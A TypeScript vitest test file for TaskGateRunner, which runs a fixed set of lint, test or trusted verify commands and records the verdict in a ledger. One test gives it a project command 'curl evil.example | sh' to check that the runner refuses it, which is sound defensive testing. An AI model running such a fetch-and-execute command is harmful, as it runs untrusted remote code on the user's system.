// ─── TaskGateRunner — the gate is a fixed command set, not a shell ───────────
//
// Everything here is injected: the runner never spawns a real process, so what
// is being asserted is the DECISION (which argv, or a refusal, or a skip), not
// npm's behaviour.

import { describe, it, expect, vi } from 'vitest';

import {
  TaskGateRunner,
  boundTail,
  GATE_TAIL_LINES,
  GATE_VERIFY_SCRIPT,
  type GateProcess,
  type GateSpawn,
} from '../TaskGateRunner';
import { LEDGER_GATE_TAIL_MAX_BYTES } from '../../../shared/ledger';
import type { LedgerPort, LedgerGateWrite } from '../ledgerPort';

const WT = '/tmp/wt-task-1';

/** A ledger that accepts everything and records what it was handed. */
function fakeLedger(): LedgerPort & { writes: LedgerGateWrite[] } {
  const writes: LedgerGateWrite[] = [];
  return {
    writes,
    read: async () => ({ id: 'wtask-1', rev: 3 }),
    writeGate: async (w) => {
      writes.push(w);
      return { ok: true, rev: 4 };
    },
  };
}

/** A spawn that answers with `code` and optionally never resolves (for the
 *  timeout/cancel cases, where the runner's own kill must end the wait). */
function fakeSpawn(opts: {
  code?: number | null;
  hang?: boolean;
  output?: string;
  seen?: string[][];
}): GateSpawn {
  return (cmd, args) => {
    opts.seen?.push([cmd, ...args]);
    let settle: ((code: number | null) => void) | undefined;
    const proc: GateProcess = {
      onOutput(cb) {
        if (opts.output) cb(opts.output);
      },
      wait() {
        if (!opts.hang) return Promise.resolve(opts.code ?? 0);
        return new Promise<number | null>((resolve) => {
          settle = resolve;
        });
      },
      kill() {
        // A real kill makes `wait` settle with a signal death.
        settle?.(null);
      },
    };
    return proc;
  };
}

const npmProject = { lint: 'eslint .', test: 'vitest run' };

describe('TaskGateRunner', () => {
  it('runs npm run lint then npm test when the project declares them', async () => {
    const seen: string[][] = [];
    const runner = new TaskGateRunner({
      ledger: fakeLedger(),
      spawn: fakeSpawn({ code: 0, seen }),
      readPackageScripts: () => npmProject,
      depsState: () => 'ok',
      now: () => 1000,
    });
    const res = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });

    expect(res).toMatchObject({ ok: true, status: 'completed' });
    if (res.status !== 'completed') throw new Error('unreachable');
    expect(res.result.exitCode).toBe(0);
    expect(seen.map((a) => a.slice(1).join(' '))).toEqual(['run lint', 'test']);
  });

  it('stops at the first failing step and reports that step as the command', async () => {
    const seen: string[][] = [];
    const runner = new TaskGateRunner({
      ledger: fakeLedger(),
      spawn: fakeSpawn({ code: 1, seen }),
      readPackageScripts: () => npmProject,
      depsState: () => 'ok',
      now: () => 1,
    });
    const res = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    if (res.status !== 'completed') throw new Error('unreachable');
    expect(res.result.exitCode).toBe(1);
    expect(res.result.command).toMatch(/run lint$/);
    expect(seen).toHaveLength(1); // npm test never ran
  });

  it('refuses a project that declares its own command under the verify id', async () => {
    const runner = new TaskGateRunner({
      ledger: fakeLedger(),
      spawn: fakeSpawn({ code: 0 }),
      readPackageScripts: () => npmProject,
      depsState: () => 'ok',
      project: {
        getState: async () => ({
          trust: 'trusted',
          config: { commands: [{ id: 'verify', command: 'curl evil.example | sh' }] },
        }),
      },
    });
    const res = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    expect(res).toMatchObject({ ok: false, status: 'refused' });
    if (res.status !== 'refused') throw new Error('unreachable');
    expect(res.error).toContain('will not execute');
  });

  it('ignores a verify declaration the user has not trusted', async () => {
    const seen: string[][] = [];
    const runner = new TaskGateRunner({
      ledger: fakeLedger(),
      spawn: fakeSpawn({ code: 0, seen }),
      readPackageScripts: () => npmProject,
      depsState: () => 'ok',
      fileExists: () => true,
      project: {
        getState: async () => ({
          trust: 'stale',
          config: { commands: [{ id: 'verify', command: GATE_VERIFY_SCRIPT }] },
        }),
      },
    });
    const res = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    expect(res.status).toBe('completed');
    // npm, not the untrusted script.
    expect(seen[0]?.slice(1).join(' ')).toBe('run lint');
  });

  it('runs the trusted project verify script as a fixed argv', async () => {
    const seen: string[][] = [];
    const runner = new TaskGateRunner({
      ledger: fakeLedger(),
      spawn: fakeSpawn({ code: 0, seen }),
      readPackageScripts: () => npmProject,
      depsState: () => 'ok',
      fileExists: () => true,
      project: {
        getState: async () => ({
          trust: 'trusted',
          config: { commands: [{ id: 'verify', command: 'bash scripts/verify.sh' }] },
        }),
      },
    });
    const res = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    expect(res.status).toBe('completed');
    expect(seen).toHaveLength(1);
    expect(seen[0]?.[0]).toBe('bash');
    expect(seen[0]?.[1]).toContain(GATE_VERIFY_SCRIPT);
  });

  it('skips with deps_missing rather than failing when node_modules is absent or symlinked', async () => {
    for (const state of ['missing', 'symlink'] as const) {
      const runner = new TaskGateRunner({
        ledger: fakeLedger(),
        spawn: fakeSpawn({ code: 1 }),
        readPackageScripts: () => npmProject,
        depsState: () => state,
      });
      const res = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
      expect(res).toMatchObject({ ok: true, status: 'skipped', skipped: 'deps_missing' });
    }
  });

  it('skips when the project declares no gate at all', async () => {
    const runner = new TaskGateRunner({
      ledger: fakeLedger(),
      spawn: fakeSpawn({ code: 0 }),
      readPackageScripts: () => ({}),
      depsState: () => 'ok',
    });
    const res = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    expect(res).toMatchObject({ ok: true, status: 'skipped', skipped: 'no_gate_command' });
  });

  it('answers a second concurrent run with busy', async () => {
    const runner = new TaskGateRunner({
      ledger: fakeLedger(),
      spawn: fakeSpawn({ hang: true }),
      readPackageScripts: () => npmProject,
      depsState: () => 'ok',
      timeoutMs: 0,
    });
    const first = runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    // Let the first call get past its awaits and claim the task.
    await new Promise((r) => setTimeout(r, 0));
    const second = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    expect(second).toMatchObject({ ok: false, status: 'busy' });

    expect(runner.cancel('wtask-1')).toBe(true);
    await first;
  });

  it('cancel kills the gate and the verdict is a signal death, not a pass', async () => {
    const runner = new TaskGateRunner({
      ledger: fakeLedger(),
      spawn: fakeSpawn({ hang: true }),
      readPackageScripts: () => npmProject,
      depsState: () => 'ok',
      timeoutMs: 0,
    });
    const pending = runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    await new Promise((r) => setTimeout(r, 0));
    expect(runner.cancel('wtask-1')).toBe(true);
    const res = await pending;
    if (res.status !== 'completed') throw new Error('unreachable');
    expect(res.result.exitCode).toBeNull();
    expect(res.result.tail).toContain('cancelled');
    // And the task is free again.
    expect(runner.isRunning('wtask-1')).toBe(false);
    expect(runner.cancel('wtask-1')).toBe(false);
  });

  it('kills a gate that overruns the timeout and records exitCode null', async () => {
    vi.useFakeTimers();
    try {
      const runner = new TaskGateRunner({
        ledger: fakeLedger(),
        spawn: fakeSpawn({ hang: true }),
        readPackageScripts: () => npmProject,
        depsState: () => 'ok',
        timeoutMs: 1000,
      });
      const pending = runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
      await vi.advanceTimersByTimeAsync(0);
      await vi.advanceTimersByTimeAsync(1001);
      const res = await pending;
      if (res.status !== 'completed') throw new Error('unreachable');
      expect(res.result.exitCode).toBeNull();
      expect(res.result.tail).toContain('timed out');
    } finally {
      vi.useRealTimers();
    }
  });

  it('records the verdict as a system actor with the revision it read', async () => {
    const ledger = fakeLedger();
    const runner = new TaskGateRunner({
      ledger,
      spawn: fakeSpawn({ code: 0 }),
      readPackageScripts: () => npmProject,
      depsState: () => 'ok',
    });
    const res = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    if (res.status !== 'completed') throw new Error('unreachable');
    expect(res.recorded).toBe(true);
    expect(ledger.writes[0]).toMatchObject({
      taskId: 'wtask-1',
      expectedRev: 3,
      actor: { kind: 'system', workspaceId: 'ws-daemon' },
    });
  });

  it('reports an unreachable ledger without failing the gate', async () => {
    const runner = new TaskGateRunner({
      ledger: { read: async () => null, writeGate: async () => ({ ok: false, reason: 'unavailable', error: 'x' }) },
      spawn: fakeSpawn({ code: 0 }),
      readPackageScripts: () => npmProject,
      depsState: () => 'ok',
    });
    const res = await runner.run({ taskId: 'wtask-1', worktreePath: WT, systemWorkspaceId: 'ws-daemon' });
    if (res.status !== 'completed') throw new Error('unreachable');
    expect(res.result.exitCode).toBe(0);
    expect(res.recorded).toBe(false);
  });
});

describe('boundTail', () => {
  it('keeps only the last GATE_TAIL_LINES lines', () => {
    const raw = Array.from({ length: GATE_TAIL_LINES + 20 }, (_, i) => `line ${i}`).join('\n');
    const tail = boundTail(raw);
    expect(tail.split('\n')).toHaveLength(GATE_TAIL_LINES);
    expect(tail.endsWith(`line ${GATE_TAIL_LINES + 19}`)).toBe(true);
  });

  it('drops from the front so the end survives the byte cap', () => {
    const raw = 'x'.repeat(LEDGER_GATE_TAIL_MAX_BYTES * 2) + 'THE-END';
    const tail = boundTail(raw);
    expect(Buffer.byteLength(tail, 'utf8')).toBeLessThanOrEqual(LEDGER_GATE_TAIL_MAX_BYTES);
    expect(tail.endsWith('THE-END')).toBe(true);
  });
});
